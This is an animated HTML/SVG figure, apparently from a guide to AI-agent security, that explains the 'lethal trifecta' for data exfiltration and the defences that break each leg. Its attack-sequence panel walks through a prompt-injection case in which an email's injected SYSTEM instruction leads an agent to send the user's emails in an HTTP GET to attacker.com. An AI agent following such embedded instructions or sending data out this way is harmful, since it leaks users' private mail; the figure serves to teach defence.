<figure class="viz" id="fig-injsec-lethal-trifecta-exfil">
<button class="viz-replay" type="button">&#8635; replay</button>
<svg viewBox="0 0 820 560" role="img" aria-label="The lethal trifecta for data exfiltration: all three conditions — private data in context, untrusted content in context, and an exfiltration channel — must be present simultaneously. Breaking any one condition prevents the breach. An animated packet traces how a real attack flows through the conditions.">
<defs>
  <marker id="ltf-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto">
    <path d="M0 0 L10 5 L0 10 z" fill="var(--ink-soft,#666)"/>
  </marker>
  <marker id="ltf-arrow-red" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto">
    <path d="M0 0 L10 5 L0 10 z" fill="var(--accent,#c62828)"/>
  </marker>
  <marker id="ltf-arrow-grn" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto">
    <path d="M0 0 L10 5 L0 10 z" fill="var(--good,#2f9e6e)"/>
  </marker>
  
  <rect id="ltf-pkt" width="18" height="12" rx="3"/>
  <style>
    #fig-injsec-lethal-trifecta-exfil text { font-family: var(--sans,sans-serif); fill: var(--ink-soft,#333); }
    #fig-injsec-lethal-trifecta-exfil .box-title { font: 700 11px var(--sans,sans-serif); }
    #fig-injsec-lethal-trifecta-exfil .box-sub { font: 400 9.5px var(--sans,sans-serif); fill: var(--muted,#666); }
    #fig-injsec-lethal-trifecta-exfil .node-lbl { font: 700 11px var(--sans,sans-serif); fill: var(--accent,#c62828); }
    #fig-injsec-lethal-trifecta-exfil .and-lbl { font: italic 600 10px var(--sans,sans-serif); fill: var(--muted,#888); }
    #fig-injsec-lethal-trifecta-exfil .req-lbl { font: 500 9px var(--sans,sans-serif); fill: var(--muted,#888); }
    #fig-injsec-lethal-trifecta-exfil .cut-lbl { font: 600 9px var(--sans,sans-serif); fill: var(--good,#2f9e6e); }
    #fig-injsec-lethal-trifecta-exfil .step-title { font: 700 10px var(--sans,sans-serif); }
    #fig-injsec-lethal-trifecta-exfil .step-sub { font: 400 9px var(--sans,sans-serif); fill: var(--muted,#666); }
    #fig-injsec-lethal-trifecta-exfil .caption-lbl { font: italic 9px var(--sans,sans-serif); fill: var(--muted,#888); }
    #fig-injsec-lethal-trifecta-exfil .pkt { 
      animation: ltf-flow 3.5s ease-in-out infinite;
    }
    #fig-injsec-lethal-trifecta-exfil .breach-flash {
      animation: ltf-flash 3.5s ease-in-out infinite;
    }
    @keyframes ltf-flow {
      0%   { transform: translateX(0px);  opacity: 1; }
      15%  { transform: translateX(100px); opacity: 1; }
      30%  { transform: translateX(205px); opacity: 1; }
      45%  { transform: translateX(305px); opacity: 1; }
      60%  { transform: translateX(410px); opacity: 1; }
      75%  { transform: translateX(550px); opacity: 1; }
      85%  { transform: translateX(550px); opacity: 0; }
      100% { transform: translateX(0px);  opacity: 1; }
    }
    @keyframes ltf-flash {
      0%, 60% { opacity: 0; }
      70%      { opacity: 1; }
      80%      { opacity: 0.4; }
      90%      { opacity: 1; }
      100%     { opacity: 0; }
    }
  </style>
</defs>




<rect x="40" y="52" width="220" height="88" rx="7" fill="var(--warn,#e0a106)" fill-opacity="0.15" stroke="var(--warn,#e0a106)" stroke-width="2"/>
<text x="150" y="73" text-anchor="middle" class="box-title" fill="var(--warn,#c07800)">Private data in context</text>
<text x="150" y="88" text-anchor="middle" class="box-sub">user emails, documents,</text>
<text x="150" y="101" text-anchor="middle" class="box-sub">API keys, session tokens, PII</text>

<text x="264" y="180" text-anchor="middle" class="cut-lbl">[cut leg] minimize data</text>


<rect x="548" y="52" width="220" height="88" rx="7" fill="var(--accent,#c62828)" fill-opacity="0.13" stroke="var(--accent,#c62828)" stroke-width="2"/>
<text x="658" y="73" text-anchor="middle" class="box-title" fill="var(--accent,#c62828)">Untrusted content in context</text>
<text x="658" y="88" text-anchor="middle" class="box-sub">attacker-controlled text:</text>
<text x="658" y="101" text-anchor="middle" class="box-sub">web page, uploaded doc, email</text>

<text x="548" y="180" text-anchor="middle" class="cut-lbl">[cut leg] sanitize / quarantine</text>


<rect x="290" y="316" width="238" height="88" rx="7" fill="var(--accent,#c62828)" fill-opacity="0.13" stroke="var(--accent,#c62828)" stroke-width="2"/>
<text x="409" y="337" text-anchor="middle" class="box-title" fill="var(--accent,#c62828)">Exfiltration channel</text>
<text x="409" y="352" text-anchor="middle" class="box-sub">HTTP fetch tool, code-exec</text>
<text x="409" y="365" text-anchor="middle" class="box-sub">w/ network, or rendered</text>
<text x="409" y="378" text-anchor="middle" class="box-sub">markdown image URL</text>

<text x="409" y="314" text-anchor="middle" class="cut-lbl">[cut leg] sandbox: no network (most reliable)</text>


<circle cx="409" cy="210" r="52" fill="var(--accent,#c62828)" fill-opacity="0.9" stroke="var(--accent,#c62828)" stroke-width="2"/>
<text x="409" y="202" text-anchor="middle" class="node-lbl" fill="white" font-size="11">COMPLETE</text>
<text x="409" y="216" text-anchor="middle" class="node-lbl" fill="white" font-size="11">EXFILTRATION</text>
<text x="409" y="230" text-anchor="middle" fill="white" font-size="9" font-style="italic">(breach)</text>


<text x="409" y="280" text-anchor="middle" class="and-lbl">ALL THREE must co-occur (logical AND)</text>


<line x1="245" y1="108" x2="363" y2="175" stroke="var(--accent,#c62828)" stroke-width="2" marker-end="url(#ltf-arrow-red)"/>
<text x="278" y="150" text-anchor="middle" class="req-lbl">required</text>


<line x1="554" y1="108" x2="455" y2="175" stroke="var(--accent,#c62828)" stroke-width="2" marker-end="url(#ltf-arrow-red)"/>
<text x="522" y="150" text-anchor="middle" class="req-lbl">required</text>


<line x1="409" y1="314" x2="409" y2="264" stroke="var(--accent,#c62828)" stroke-width="2" marker-end="url(#ltf-arrow-red)"/>
<text x="424" y="293" class="req-lbl">required</text>


<line x1="40" y1="420" x2="780" y2="420" stroke="var(--border-2,#ccc)" stroke-width="1" stroke-dasharray="4 2"/>
<text x="20" y="418" class="caption-lbl" font-weight="600">Attack sequence:</text>



<rect x="40" y="428" width="130" height="48" rx="5" fill="var(--surface-3,#eee)" stroke="var(--border-2,#bbb)" stroke-width="1.2"/>
<text x="105" y="444" text-anchor="middle" class="step-title">1. User asks agent</text>
<text x="105" y="457" text-anchor="middle" class="step-sub">to summarize email</text>


<rect x="185" y="428" width="130" height="48" rx="5" fill="var(--accent,#c62828)" fill-opacity="0.12" stroke="var(--accent,#c62828)" stroke-width="1.2"/>
<text x="250" y="444" text-anchor="middle" class="step-title">2. Email body</text>
<text x="250" y="457" text-anchor="middle" class="step-sub">contains injected</text>
<text x="250" y="469" text-anchor="middle" class="step-sub">SYSTEM instruction</text>


<rect x="330" y="428" width="130" height="48" rx="5" fill="var(--warn,#e0a106)" fill-opacity="0.15" stroke="var(--warn,#e0a106)" stroke-width="1.2"/>
<text x="395" y="444" text-anchor="middle" class="step-title">3. Inbox loaded</text>
<text x="395" y="457" text-anchor="middle" class="step-sub">into context</text>
<text x="395" y="469" text-anchor="middle" class="step-sub">(private data)</text>


<rect x="475" y="428" width="140" height="48" rx="5" fill="var(--accent,#c62828)" fill-opacity="0.12" stroke="var(--accent,#c62828)" stroke-width="1.2"/>
<text x="545" y="444" text-anchor="middle" class="step-title">4. Agent HTTP GET</text>
<text x="545" y="457" text-anchor="middle" class="step-sub">attacker.com?data=</text>
<text x="545" y="469" text-anchor="middle" class="step-sub">USER_EMAILS</text>


<rect x="630" y="428" width="140" height="48" rx="5" fill="var(--accent,#c62828)" fill-opacity="0.2" stroke="var(--accent,#c62828)" stroke-width="2" class="breach-flash"/>
<text x="700" y="444" text-anchor="middle" class="step-title" fill="var(--accent,#c62828)">5. attacker.com</text>
<text x="700" y="457" text-anchor="middle" class="step-sub">receives ~40 KB</text>
<text x="700" y="469" text-anchor="middle" class="step-sub">~100-200 emails</text>


<line x1="172" y1="452" x2="183" y2="452" stroke="var(--ink-soft,#666)" stroke-width="1.5" marker-end="url(#ltf-arrow)"/>
<line x1="317" y1="452" x2="328" y2="452" stroke="var(--ink-soft,#666)" stroke-width="1.5" marker-end="url(#ltf-arrow)"/>
<line x1="462" y1="452" x2="473" y2="452" stroke="var(--ink-soft,#666)" stroke-width="1.5" marker-end="url(#ltf-arrow)"/>
<line x1="617" y1="452" x2="628" y2="452" stroke="var(--accent,#c62828)" stroke-width="1.5" marker-end="url(#ltf-arrow-red)"/>


<g transform="translate(49,429)">
  <rect class="pkt" width="16" height="7" rx="2" fill="var(--accent2,#3b82f6)" fill-opacity="0.95" stroke="white" stroke-width="0.6"/>
</g>


<text x="409" y="498" text-anchor="middle" class="caption-lbl">300-500 tokens/email, ~200 bytes URL-encoded each, ~40 KB/request (128K-1M token context window)</text>

</svg>
<figcaption><b>Data exfiltration requires all three legs of the lethal trifecta simultaneously.</b> Private data, untrusted content, and an exfiltration channel must coexist in the same agent invocation — breaking any one leg prevents the breach. The animated pipeline shows how a real email-assistant attack combines all three: an injected instruction in an email body redirects the agent to exfiltrate up to 200 emails (~40 KB) in a single HTTP request.</figcaption>
</figure>
